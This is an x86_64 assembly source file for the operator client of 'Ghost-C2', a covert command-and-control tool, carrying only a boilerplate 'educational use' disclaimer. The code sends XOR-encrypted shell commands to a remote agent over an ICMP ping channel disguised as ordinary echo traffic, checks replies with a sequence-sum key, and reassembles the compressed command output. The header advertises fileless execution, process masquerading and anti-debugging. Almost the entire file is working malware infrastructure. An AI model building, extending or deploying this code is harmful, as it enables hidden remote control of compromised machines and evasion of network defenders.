; ===================================================================================
;  ________  ___  ___  ________  ________  _________        ________  ________     
; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \    
; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \   
;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \  
;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \ 
;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
;                                   \|_________|                                   
; ===================================================================================
; Project      : Ghost-C2 (v3.0.2) - "The Invisible ICMP Phantom"
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Pure Assembly, Libc-free)
; -----------------------------------------------------------------------------------
; Features:
;   - Transport: ICMP Stealth Channel (Asymmetric ID+SEQ Auth: 45k/55k Sum)
;   - Security: Rolling XOR Encryption (Dynamic Entropy)
;   - Stealth: Fileless Execution (memfd_create) & Process Masquerading
;   - Anti-Analysis: ptrace(PTRACE_TRACEME) & prctl(PR_SET_DUMPABLE)
;   - Decompression: dpcm-rle-hybrid-x64-compressor
;   - AND MORE : Adaptive Jitter, RDTSC Mimicry, and Syscall Obfuscation.
; -----------------------------------------------------------------------------------
; Disclaimer: This tool is developed for educational and authorized penetration 
; testing purposes only. The author is not responsible for any misuse.
; -----------------------------------------------------------------------------------
; Build: nasm -f elf64 client.asm -o client.o && ld client.o -o client
; ===================================================================================


section .bss
    fd_no resb 4                
    sniffed_data resb 1200      
    incoming_addr resb 16       
    addr_len      resd 1        
    addr_ip resb 16             
    ip_buf resb 16              
    
    ; --- DECOMPRESSION BUFFERS ---
    full_compressed   resb 5242880   ; 5MB: Ajandan gelen sıkıştırılmış verileri toplama alanı
    full_decompressed resb 10485760  ; 10MB: Çözülmüş metin alanı
    total_received    resq 1         ; Toplam alınan bayt sayacı

section .data
    msg_ip db "Target IP: "
    len_msg_ip equ $ - msg_ip
    msg_cmd db "Command: "
    len_msg_cmd equ $ - msg_cmd
    newline db 10
    space_char db 32
    
    icmp_packet:
        type db 8
        code db 0
        checksum dw 0
        identifier dw 0
        sequence dw 0
        mimicry_ts dq 0
        mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                    db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        payload times 100 db 0
    payload_len equ $ - payload 

    target_addr:
        dw 2
        dw 0
        dd 0
        dq 0

section .text
global _start

_start:
    ; Create Socket
    mov rax, 41
    mov rdi, 2 ; AF_INET
    mov rsi, 3 ; SOCK_RAW
    mov rdx, 1 ; IPPROTO_ICMP
    syscall
    mov [fd_no], eax

    ; Display IP Prompt
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_ip]
    mov rdx, len_msg_ip
    syscall

    ; Read IP
    mov rax, 0
    mov rdi, 0
    lea rsi, [ip_buf]
    mov rdx, 16
    syscall

    ; Parse IP to Struct
    lea rsi, [ip_buf]
    lea rdi, [target_addr + 4]
    xor ebx, ebx
_parse_ip_loop:
    lodsb
    cmp al, 10
    je .store_byte
    cmp al, 46
    je .store_byte
    sub al, 48
    imul ebx, 10
    add ebx, eax
    jmp _parse_ip_loop
.store_byte:
    mov [rdi], bl
    inc rdi
    xor ebx, ebx
    cmp al, 10
    je _get_command
    jmp _parse_ip_loop

_get_command:
    ; Reset Decompression State for Every New Command
    mov qword [total_received], 0

    ; Clear Payload
    lea rdi, [payload]
    xor al, al
    mov rcx, 100
    rep stosb
    
    ; Display Cmd Prompt
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_cmd]
    mov rdx, len_msg_cmd
    syscall

    ; Read Cmd
    mov rax, 0
    mov rdi, 0
    lea rsi, [payload]
    mov rdx, 100
    syscall
    
    dec rax
    mov byte [payload + rax], 0
    
    ; XOR Payload Before Sending
    lea rsi, [payload]
    mov rcx, 100
    push rsi
    call _xor_cipher
	pop rsi

    rdtsc
    mov [icmp_packet + 8], rax

    call _create_seq_id
    call _checksum_cal
    call _sendto

_sniff:
    ; Reset Receive Buffer
    lea rdi, [sniffed_data]
    xor al, al
    mov rcx, 1200
    rep stosb

    ; Recvfrom
    mov rax, 45
    mov edi, [fd_no]
    lea rsi, [sniffed_data]
    mov rdx, 1200
    mov dword [addr_len], 16
    lea r8, [incoming_addr]
    lea r9, [addr_len]
    syscall

    cmp rax, 52 ; IP(20) + ICMP(8) + Mimicry(24)
    jb _sniff

    ; ICMP Type 0 Filter
    cmp byte [sniffed_data + 20], 0
    jne _sniff

	push rax
    push rdx


    ; Sequence Auth Check
    movzx eax, word [sniffed_data + 26]
    xchg al, ah
    movzx edx, word [sniffed_data + 24]
    xchg dl, dh
    add eax, edx
    cmp eax, 55000 ; Agent Asymmetric Return Key
    
    pop rdx
    pop rax
    
    jne _sniff

    ; --- [REASSEMBLY LOGIC] ---
    mov r14, rax
    sub r14, 52                 ; Payload length
    
    ; --- [PROTECTION: PADDING CLEANSING] ---
    cmp r14, 56                 ; Payload 56'dan büyük olamaz (Ajan kısıtlaması)
    jbe .size_is_ok
    mov r14, 56                 ; Eğer büyükse (çöp varsa) 56'da kes!
 
.size_is_ok:
    ; ----------------------------------------
    
    cmp r14, 1					; EOF CHECK
    je _process_output
    
    lea rsi, [sniffed_data + 52]
    
    ; 1. XOR Decode
    mov rcx, r14
    push rsi
    call _xor_cipher 
	pop rsi

    ; 2. Add to Collector Buffer
    lea rdi, [full_compressed]
    add rdi, [total_received]
    mov rcx, r14
    rep movsb                   ; Copy fragment to assembly line
    add [total_received], r14

    ; 3. Check for End of Stream
    cmp r14, 56                 ; Full packet?
    je _sniff                   ;
    
    jmp _process_output
    
    ; --- [DECOMPRESSION TRIGGER] ---
_process_output:
    lea rsi, [full_compressed]
    lea rdi, [full_decompressed]
    mov rcx, [total_received]
    call _vesqer_decompress     ; Boom!
    
    ; rax = decompressed size
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    lea rsi, [full_decompressed]
    syscall

    ; Print Formatting
    mov rax, 1
    mov rdi, 1
    lea rsi, [newline]
    mov rdx, 1
    syscall

    jmp _get_command            ; Back to CMD loop

; ====================================================================
; UTILITY FUNCTIONS
; ====================================================================

_vesqer_decompress:
    push rbx
    push rcx
    push rsi
    push rdi
    push r11
    
    mov r11, rdi                ; Anchor start pointer
    test rcx, rcx
    jz .done

    mov bl, byte [rsi]          ; Load Anchor
    inc rsi
    mov byte [rdi], bl          ; Write Anchor
    inc rdi
    dec rcx                     

.loop:
    test rcx, rcx
    jz .done

    mov dl, byte [rsi]          ; DL = Count
    inc rsi
    dec rcx
    
    test dl, dl                 ; Sayı 0 mı geldi
    jz .loop
    
    test rcx, rcx
    jz .done

    mov al, byte [rsi]          ; AL = Delta
    inc rsi
    dec rcx

    test dl, dl
    jz .loop

	
.write_run:
	add bl, al                  ; Current + Delta
    mov byte [rdi], bl          
    inc rdi
    dec dl
    jnz .write_run
    jmp .loop

.done:
    mov rax, rdi
    sub rax, r11                ; RAX = Real Decompressed Length
    pop r11
    pop rdi
    pop rsi
    pop rcx
    pop rbx
    ret

_xor_cipher:
    test rcx, rcx
    jz .done
    push rsi
    push rdx
    mov dl, 0x42
.loop:
    xor byte [rsi], dl
    add dl, 0x07
    inc rsi
    loop .loop
    pop rdx
    pop rsi
.done:
    ret

_checksum_cal:
    mov word [icmp_packet + 2], 0
    xor rcx, rcx
    mov rcx, 132                ; 8 (Hdr) + 124 (Mimicry + Payload)
    lea rsi, [icmp_packet]
    xor rax, rax
.loop:
    movzx edx, word [rsi]
    add eax, edx
    add rsi, 2
    sub rcx, 2
    jnz .loop
    mov edx, eax
    shr edx, 16
    and eax, 0xFFFF
    add ax, dx
    adc ax, 0
    not ax
    mov [icmp_packet + 2], ax
    ret

_sendto:
    mov rax, 44
    mov rdi, [fd_no]
    lea rsi, [icmp_packet]
    mov rdx, 132
    mov r10, 0
    lea r8, [target_addr]
    mov r9, 16
    syscall
    ret

_create_seq_id:
    rdtsc
    xor edx, edx
    mov ecx, 20000
    div ecx
    add edx, 10000
    mov eax, 45000
    sub eax, edx
    xchg dl, dh
    xchg al, ah
    mov word [icmp_packet + 4], dx
    mov word [icmp_packet + 6], ax
    ret

_create_seq_id_agent_side:
    ret

_error:
    mov rax, 60
    mov rdi, 1
    syscall

_exit:
    mov rax, 60
    mov rdi, 0
    syscall
